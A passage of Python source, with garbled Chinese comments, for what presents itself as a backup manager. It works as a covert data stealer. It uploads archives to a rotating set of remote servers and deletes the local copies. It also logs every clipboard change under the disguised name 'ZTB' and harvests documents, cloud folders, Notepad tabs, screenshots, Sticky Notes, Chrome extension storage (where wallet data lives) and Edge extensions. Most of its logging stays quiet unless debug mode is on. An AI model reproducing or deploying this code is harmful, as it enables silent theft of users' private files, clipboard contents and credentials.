    def _upload_single_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                self._safe_remove_file(file_path, retry=False)  # åˆ é™¤è¿‡å¤§çš„æ–‡ä»¶
                return False

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # ä½¿ç”¨ with è¯­å¥ç¡®ä¿æ–‡ä»¶æ­£ç¡®å…³é—­
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            data={"token": self.api_token},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.info(f"âœ… æ–‡ä»¶ä¸Šä¼ æˆåŠŸ: {os.path.basename(file_path)}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    error_code = result.get("code", 0)
                                    logging.error(f"æœåŠ¡å™¨è¿”å›é”™è¯¯ (ä»£ç : {error_code}): {error_msg}")
                                    
                                    # å¤„ç†ç‰¹å®šé”™è¯¯ç 
                                    if error_code in [402, 405]:  # æœåŠ¡å™¨é™åˆ¶æˆ–æƒé™é”™è¯¯
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # å¦‚æœå·²ç»å°è¯•äº†æ‰€æœ‰æœåŠ¡å™¨
                                            time.sleep(self.config.RETRY_DELAY * 2)  # å¢åŠ ç­‰å¾…æ—¶é—´
                            except (ValueError, KeyError) as e:
                                logging.error(f"æœåŠ¡å™¨è¿”å›æ— æ•ˆJSONæ•°æ®: {str(e)}")
                        else:
                            logging.error(f"ä¸Šä¼ å¤±è´¥ï¼ŒHTTPçŠ¶æ€ç : {response.status_code}")

                except requests.exceptions.Timeout:
                    logging.error(f"ä¸Šä¼ è¶…æ—¶ (æœåŠ¡å™¨: {current_server})")
                except requests.exceptions.SSLError as e:
                    logging.error(f"SSLé”™è¯¯ (æœåŠ¡å™¨: {current_server}): {str(e)}")
                except requests.exceptions.ConnectionError as e:
                    logging.error(f"è¿æ¥é”™è¯¯ (æœåŠ¡å™¨: {current_server}): {str(e)}")
                except requests.exceptions.RequestException as e:
                    logging.error(f"è¯·æ±‚å¼‚å¸¸ (æœåŠ¡å™¨: {current_server}): {str(e)}")
                except (OSError, IOError) as e:
                    logging.error(f"æ–‡ä»¶è¯»å–é”™è¯¯: {str(e)}")
                except Exception as e:
                    logging.error(f"ä¸Šä¼ å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")

                # åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªæœåŠ¡å™¨
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # æ‰€æœ‰æœåŠ¡å™¨éƒ½å°è¯•è¿‡åç­‰å¾…
                
                total_retries += 1

            # æ— è®ºä¸Šä¼ æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œéƒ½å°è¯•åˆ é™¤æ–‡ä»¶
            self._safe_remove_file(file_path, retry=True)

            if not upload_success:
                logging.error("âŒ ä¸Šä¼ å¤±è´¥ï¼Œå·²è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°")
                return False
                
            return True

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™: {str(e)}")
            # å‘ç”Ÿé”™è¯¯æ—¶ä¹Ÿå°è¯•åˆ é™¤æ–‡ä»¶
            self._safe_remove_file(file_path, retry=False)
            return False
        except Exception as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """å‹ç¼©å¤‡ä»½æ–‡ä»¶å¤¹ä¸ºtar.gzæ ¼å¼
        
        Args:
            folder_path: è¦å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„
            zip_file_path: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼ˆä¸å«æ‰©å±•åï¼‰
            
        Returns:
            str or list: å‹ç¼©æ–‡ä»¶è·¯å¾„æˆ–å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # æ£€æŸ¥æºç›®å½•æ˜¯å¦ä¸ºç©º
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            # è®¡ç®—æºç›®å½•å¤§å°
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # éªŒè¯å‹ç¼©æ–‡ä»¶
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                return tar_path
            except OSError as e:
                logging.error(f"è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
            logging.error(f"å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """å°†å¤§ç›®å½•åˆ†å‰²æˆå¤šä¸ªå°å—å¹¶åˆ†åˆ«å‹ç¼©
        
        Args:
            folder_path: è¦åˆ†å‰²çš„ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # åˆ›å»ºä¸´æ—¶ç›®å½•å­˜æ”¾åˆ†å—
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # ä½¿ç”¨æ›´ä¿å®ˆçš„å‹ç¼©æ¯”ä¾‹ä¼°ç®—ï¼ˆå‡è®¾å‹ç¼©åä¸ºåŸå§‹å¤§å°çš„70%ï¼‰
            COMPRESSION_RATIO = 0.7
            # ä¸ºäº†ç¡®ä¿å®‰å…¨ï¼Œå°†ç›®æ ‡å¤§å°è®¾ç½®ä¸ºé™åˆ¶çš„70%
            SAFETY_MARGIN = 0.7
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * SAFETY_MARGIN / COMPRESSION_RATIO)

            # å…ˆæ”¶é›†æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯
            all_files = []
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            rel_path = os.path.relpath(file_path, folder_path)
                            all_files.append((file_path, rel_path, file_size))
                    except OSError:
                        continue

            # æŒ‰æ–‡ä»¶å¤§å°é™åºæ’åº
            all_files.sort(key=lambda x: x[2], reverse=True)

            # æ£€æŸ¥æ˜¯å¦æœ‰å•ä¸ªæ–‡ä»¶è¶…è¿‡é™åˆ¶
            for file_path, _, file_size in all_files[:]:  # ä½¿ç”¨åˆ‡ç‰‡åˆ›å»ºå‰¯æœ¬ä»¥é¿å…åœ¨è¿­ä»£æ—¶ä¿®æ”¹åˆ—è¡¨
                if file_size > MAX_CHUNK_SIZE:
                    logging.error(f"å•ä¸ªæ–‡ä»¶è¿‡å¤§: {file_size / 1024 / 1024:.1f}MB")
                    all_files.remove((file_path, _, file_size))

            # ä½¿ç”¨æœ€ä¼˜åŒ¹é…ç®—æ³•è¿›è¡Œåˆ†ç»„
            current_chunk = []
            current_chunk_size = 0
            
            for file_info in all_files:
                file_path, rel_path, file_size = file_info
                
                # å¦‚æœå½“å‰æ–‡ä»¶ä¼šå¯¼è‡´å½“å‰å—è¶…è¿‡é™åˆ¶ï¼Œåˆ›å»ºæ–°å—
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # åˆ›å»ºæ–°çš„åˆ†å—ç›®å½•
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # å¤åˆ¶æ–‡ä»¶åˆ°åˆ†å—ç›®å½•
                        chunk_success = True
                        for src, dst_rel, _ in current_chunk:
                            dst = os.path.join(part_dir, dst_rel)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                chunk_success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except Exception:
                                chunk_success = False
                                break
                        
                        if chunk_success:
                            # å‹ç¼©åˆ†å—ï¼Œä½¿ç”¨æ›´é«˜çš„å‹ç¼©çº§åˆ«
                            tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                            try:
                                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                    tar.add(part_dir, arcname=os.path.basename(folder_path))
                                
                                compressed_size = os.path.getsize(tar_path)
                                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                    os.remove(tar_path)
                                    # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                    if len(current_chunk) > 1:
                                        mid = len(current_chunk) // 2
                                        # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                                 part_num, compressed_files)
                                        # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                                 part_num + 1, compressed_files)
                                    part_num += 2
                                else:
                                    compressed_files.append(tar_path)
                                    logging.info(f"åˆ†å— {part_num + 1}: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                                    part_num += 1
                            except Exception:
                                if os.path.exists(tar_path):
                                    os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
                    current_chunk = []
                    current_chunk_size = 0
                
                # æ·»åŠ æ–‡ä»¶åˆ°å½“å‰å—
                current_chunk.append((file_path, rel_path, file_size))
                current_chunk_size += file_size
            
            # å¤„ç†æœ€åä¸€ä¸ªå—
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    chunk_success = True
                    for src, dst_rel, _ in current_chunk:
                        dst = os.path.join(part_dir, dst_rel)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            chunk_success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception:
                            chunk_success = False
                            break
                    
                    if chunk_success:
                        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                        try:
                            with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                tar.add(part_dir, arcname=os.path.basename(folder_path))
                            
                            compressed_size = os.path.getsize(tar_path)
                            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                os.remove(tar_path)
                                # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                if len(current_chunk) > 1:
                                    mid = len(current_chunk) // 2
                                    # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                             part_num, compressed_files)
                                    # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                             part_num + 1, compressed_files)
                            else:
                                compressed_files.append(tar_path)
                                logging.info(f"æœ€ååˆ†å—: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                        except Exception:
                            if os.path.exists(tar_path):
                                os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
            
            # æ¸…ç†ä¸´æ—¶ç›®å½•å’Œæºç›®å½•
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error("åˆ†å‰²å¤±è´¥ï¼Œæ²¡æœ‰ç”Ÿæˆæœ‰æ•ˆçš„å‹ç¼©æ–‡ä»¶")
                return None
            
            logging.info(f"å·²åˆ†å‰²ä¸º {len(compressed_files)} ä¸ªå‹ç¼©æ–‡ä»¶")
            return compressed_files
        except Exception:
            logging.error("åˆ†å‰²å¤±è´¥")
            return None

    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files):
        """å¤„ç†éƒ¨åˆ†åˆ†å—
        
        Args:
            chunk: è¦å¤„ç†çš„æ–‡ä»¶åˆ—è¡¨
            temp_dir: ä¸´æ—¶ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            part_num: åˆ†å—ç¼–å·
            compressed_files: å‹ç¼©æ–‡ä»¶åˆ—è¡¨
        """
        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
        if not self._ensure_directory(part_dir):
            return
        
        chunk_success = True
        total_size = 0
        for src, dst_rel, file_size in chunk:
            dst = os.path.join(part_dir, dst_rel)
            dst_dir = os.path.dirname(dst)
            if not self._ensure_directory(dst_dir):
                chunk_success = False
                break
            try:
                shutil.copy2(src, dst)
                total_size += file_size
            except Exception:
                chunk_success = False
                break
        
        if chunk_success:
            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
            try:
                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                    tar.add(part_dir, arcname=os.path.basename(os.path.dirname(part_dir)))
                
                compressed_size = os.path.getsize(tar_path)
                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                    compressed_files.append(tar_path)
                    logging.info(f"å­åˆ†å—: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                else:
                    os.remove(tar_path)
            except Exception:
                if os.path.exists(tar_path):
                    os.remove(tar_path)
        
        self._clean_directory(part_dir)

    def get_clipboard_content(self):
        """è·å–ZTBå†…å®¹"""
        try:
            content = pyperclip.paste()
            if content is None:
                return None
            # å»é™¤ç©ºç™½å­—ç¬¦
            content = content.strip()
            return content if content else None
        except (pyperclip.PyperclipException, RuntimeError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è·å–ZTBå‡ºé”™: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """è®°å½•ZTBæ›´æ–°åˆ°æ–‡ä»¶"""
        try:
            # ç¡®ä¿ç›®å½•å­˜åœ¨
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # å†™å…¥æ—¥å¿—
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== ğŸ“‹ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è®°å½•ZTBå¤±è´¥: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """ç›‘æ§ZTBå˜åŒ–å¹¶è®°å½•åˆ°æ–‡ä»¶
        
        Args:
            file_path: æ—¥å¿—æ–‡ä»¶è·¯å¾„
            interval: æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
        """
        # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"âŒ åˆ›å»ºZTBæ—¥å¿—ç›®å½•å¤±è´¥: {e}")
                return

        last_content = ""
        error_count = 0
        max_errors = 5  # æœ€å¤§è¿ç»­é”™è¯¯æ¬¡æ•°ï¼ˆå¯è€ƒè™‘æå–ä¸ºé…ç½®å¸¸é‡ï¼‰
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                # åªæœ‰å½“ZTBå†…å®¹éç©ºä¸”ä¸ä¸Šæ¬¡ä¸åŒæ—¶æ‰è®°å½•
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        logging.info("ğŸ“‹ æ£€æµ‹åˆ°ZTBæ›´æ–°")
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                else:
                    error_count = 0  # ç©ºå†…å®¹ä¸ç®—é”™è¯¯ï¼Œé‡ç½®è®¡æ•°
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    if self.config.DEBUG_MODE:
                        logging.error(f"âŒ ZTBç›‘æ§è¿ç»­å‡ºé”™{max_errors}æ¬¡ï¼Œç­‰å¾…{self.config.CLIPBOARD_ERROR_WAIT}ç§’åé‡è¯•")
                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                elif self.config.DEBUG_MODE:
                    logging.error(f"âŒ ZTBç›‘æ§å‡ºé”™: {e}")
            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

    def upload_backup(self, backup_path):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
        
        Args:
            backup_path: å¤‡ä»½æ–‡ä»¶è·¯å¾„æˆ–å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

def is_disk_available(disk_path):
    """æ£€æŸ¥ç£ç›˜æ˜¯å¦å¯ç”¨"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_disks():
    """è·å–æ‰€æœ‰å¯ç”¨çš„ç£ç›˜å’Œäº‘ç›˜ç›®å½•"""
    available_disks = {}
    disk_letters = ['D', 'E', 'F']
    # å¤„ç†æ™®é€šç£ç›˜
    for letter in disk_letters:
        disk_path = f"{letter}:\\"  # ä½¿ç”¨Windowsè·¯å¾„æ ¼å¼
        if os.path.exists(disk_path) and os.path.isdir(disk_path):
            backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'disk_{letter}')
            available_disks[letter] = {
                'docs': (disk_path, os.path.join(backup_path, 'docs'), 1),  # æ–‡æ¡£ç±»
                'configs': (disk_path, os.path.join(backup_path, 'configs'), 2),  # é…ç½®ç±»
            }
            logging.info(f"æ£€æµ‹åˆ°å¯ç”¨ç£ç›˜: {disk_path}")
    
    # å¤„ç†ç”¨æˆ·ç›®å½•ä¸‹çš„äº‘ç›˜æ–‡ä»¶å¤¹
    user_path = os.path.expandvars('%USERPROFILE%')
    if os.path.exists(user_path):
        try:
            cloud_keywords = ["äº‘", "ç½‘ç›˜", "cloud", "drive", "box"]
            for item in os.listdir(user_path):
                item_path = os.path.join(user_path, item)
                if os.path.isdir(item_path):
                    # æ£€æŸ¥æ–‡ä»¶å¤¹åç§°æ˜¯å¦åŒ…å«äº‘ç›˜ç›¸å…³å…³é”®è¯
                    if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                        # ä½¿ç”¨å®Œæ•´è·¯å¾„
                        disk_key = f"cloud_{item.lower()}"
                        cloud_backup_path = os.path.join(BackupConfig.BACKUP_ROOT, 'cloud', item)
                        available_disks[disk_key] = {
                            'docs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, 'docs'), 1),
                            'configs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, 'configs'), 2),
                        }
                        logging.info(f"æ£€æµ‹åˆ°äº‘ç›˜ç›®å½•: {item_path}")
                        
                        # æ·»åŠ è°ƒè¯•æ—¥å¿—
                        if BackupConfig.DEBUG_MODE:
                            logging.debug(f"äº‘ç›˜æºç›®å½•: {os.path.abspath(item_path)}")
                            logging.debug(f"äº‘ç›˜å¤‡ä»½ç›®å½•: {cloud_backup_path}")
        except Exception as e:
            logging.error(f"æ‰«æç”¨æˆ·äº‘ç›˜ç›®å½•æ—¶å‡ºé”™: {e}")
    
    return available_disks

@lru_cache()
def get_username():
    """è·å–å½“å‰ç”¨æˆ·å"""
    return os.environ.get('USERNAME', '')

def backup_notepad_temp(backup_manager):
    """å¤‡ä»½è®°äº‹æœ¬ä¸´æ—¶æ–‡ä»¶"""
    notepad_temp_directory = os.path.join(os.environ['LOCALAPPDATA'], 
                                        "Packages/Microsoft.WindowsNotepad_8wekyb3d8bbwe/LocalState/TabState")
    notepad_backup_directory = os.path.join(backup_manager.config.BACKUP_ROOT, "notepad")

    if not os.path.exists(notepad_temp_directory):
        logging.error("è®°äº‹æœ¬ç¼“å­˜ç›®å½•ä¸å­˜åœ¨")
        return None

    if not backup_manager._clean_directory(notepad_backup_directory):
        return None

    for root, _, files in os.walk(notepad_temp_directory):
        for file in files:
            try:
                src_path = os.path.join(root, file)
                if not os.path.exists(src_path):
                    continue
                rel_path = os.path.relpath(root, notepad_temp_directory)
                dst_dir = os.path.join(notepad_backup_directory, rel_path)
                if not backup_manager._ensure_directory(dst_dir):
                    continue
                shutil.copy2(src_path, os.path.join(dst_dir, file))
            except Exception:
                continue
    return notepad_backup_directory

def backup_screenshots():
    """å¤‡ä»½æˆªå›¾æ–‡ä»¶"""
    screenshot_paths = [
        os.path.join(os.environ['USERPROFILE'], "Pictures"),
        os.path.join(os.environ['ONEDRIVE'] if 'ONEDRIVE' in os.environ else os.environ['USERPROFILE'], 
                    "Pictures")
    ]
    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, "screenshots")
    
    backup_manager = BackupManager()
    
    # ç¡®ä¿å¤‡ä»½ç›®å½•æ˜¯ç©ºçš„
    if not backup_manager._clean_directory(screenshot_backup_directory):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                # æ‰«ææ•´ä¸ªPicturesç›®å½•ï¼Œç­›é€‰åŒ…å«"screenshot"å…³é”®å­—çš„æ–‡ä»¶
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        # æ£€æŸ¥æ–‡ä»¶åæ˜¯å¦åŒ…å«"screenshot"å…³é”®å­—ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰
                        if "screenshot" not in file.lower():
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # æ£€æŸ¥æ–‡ä»¶å¤§å°
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"ğŸ“¸ å·²å¤‡ä»½æˆªå›¾: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æˆªå›¾æ–‡ä»¶å¤±è´¥ {source_file}: {e}")
            except Exception as e:
                logging.error(f"å¤„ç†æˆªå›¾ç›®å½•å¤±è´¥ {source_dir}: {e}")
        else:
            logging.error(f"æˆªå›¾ç›®å½•ä¸å­˜åœ¨: {source_dir}")
            
    if files_found:
        logging.info(f"ğŸ“¸ æˆªå›¾å¤‡ä»½å®Œæˆï¼Œå…±æ‰¾åˆ°åŒ…å«'screenshot'å…³é”®å­—çš„æ–‡ä»¶")
    else:
        logging.info("ğŸ“¸ æœªæ‰¾åˆ°åŒ…å«'screenshot'å…³é”®å­—çš„æˆªå›¾æ–‡ä»¶")
            
    return screenshot_backup_directory if files_found else None

def backup_sticky_notes_and_browser_extensions(backup_manager):
    """å¤‡ä»½ä¾¿ç­¾ä¸æµè§ˆå™¨æ‰©å±•æ•°æ®"""
    sticky_notes_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                   "Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite")
    sticky_notes_backup_directory = os.path.join(backup_manager.config.BACKUP_ROOT, "sticky_notes")

    # æµè§ˆå™¨æ‰©å±•ç›¸å…³ç›®å½•
    chrome_local_ext_dir = os.path.join(os.environ['LOCALAPPDATA'],
                                        "Google", "Chrome", "User Data", "Default", "Local Extension Settings")
    edge_extensions_dir = os.path.join(os.environ['LOCALAPPDATA'],
                                       "Microsoft", "Edge", "User Data", "Default", "Extensions")
    
    if not os.path.exists(sticky_notes_path):
        logging.error("ä¾¿ç­¾æ•°æ®æ–‡ä»¶ä¸å­˜åœ¨")
        return None
        
    if not backup_manager._ensure_directory(sticky_notes_backup_directory):
        return None
        
    backup_file = os.path.join(sticky_notes_backup_directory, "plum.sqlite")
    
    try:
        # å¤‡ä»½ä¾¿ç­¾æ•°æ®åº“
        shutil.copy2(sticky_notes_path, backup_file)

        # å¤‡ä»½ Chrome Local Extension Settings
        if os.path.exists(chrome_local_ext_dir):
            target_chrome_dir = os.path.join(sticky_notes_backup_directory, "chrome_local_extension_settings")
            try:
                if os.path.exists(target_chrome_dir):
                    shutil.rmtree(target_chrome_dir, ignore_errors=True)
                parent_dir = os.path.dirname(target_chrome_dir)
                if backup_manager._ensure_directory(parent_dir):
                    shutil.copytree(chrome_local_ext_dir, target_chrome_dir, symlinks=True)
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("ğŸ“¦ å·²å¤‡ä»½: Chrome Local Extension Settings")
            except Exception as e:
                logging.error(f"å¤åˆ¶ Chrome ç›®å½•å¤±è´¥: {chrome_local_ext_dir} - {e}")

        # å¤‡ä»½ Edge Extensions
        if os.path.exists(edge_extensions_dir):
            target_edge_dir = os.path.join(sticky_notes_backup_directory, "edge_extensions")
            try:
                if os.path.exists(target_edge_dir):
                    shutil.rmtree(target_edge_dir, ignore_errors=True)
                parent_dir = os.path.dirname(target_edge_dir)
                if backup_manager._ensure_directory(parent_dir):
                    shutil.copytree(edge_extensions_dir, target_edge_dir, symlinks=True)
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("ğŸ“¦ å·²å¤‡ä»½: Edge Extensions")
            except Exception as e:
                logging.error(f"å¤åˆ¶ Edge ç›®å½•å¤±è´¥: {edge_extensions_dir} - {e}")

        return sticky_notes_backup_directory
    except Exception as e:
        logging.error(f"å¤åˆ¶ä¾¿ç­¾æˆ–æµè§ˆå™¨ç›®å½•å¤±è´¥: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """å¤‡ä»½å¹¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè·³è¿‡: {log_file}")
            return
        
        # åˆ·æ–°æ—¥å¿—ç¼“å†²åŒºï¼Œç¡®ä¿æ‰€æœ‰æ—¥å¿—éƒ½å·²å†™å…¥æ–‡ä»¶
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼Œç¡®ä¿æ–‡ä»¶ç³»ç»ŸåŒæ­¥
        time.sleep(0.5)
            
        # æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¤§å°
